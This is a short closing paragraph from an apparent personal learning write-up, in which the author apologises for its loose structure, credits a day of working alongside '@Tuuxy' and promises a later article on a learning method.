+I wrote this without too much thought about the structure, because it was mostly about working through my own understanding of the concepts (sorry for the mess). And while I do use informal terms that aren't always super precise, I think I've gotten a good grasp of the topics I've covered here. This is only one day of working side by side with `@Tuuxy` and I can already feel myself become more cracked by the minute. He's actually talked to me about a different learning method that I'm seriously considering adding to my regiment, I'll write an article about it later since it seems to be very effective!!
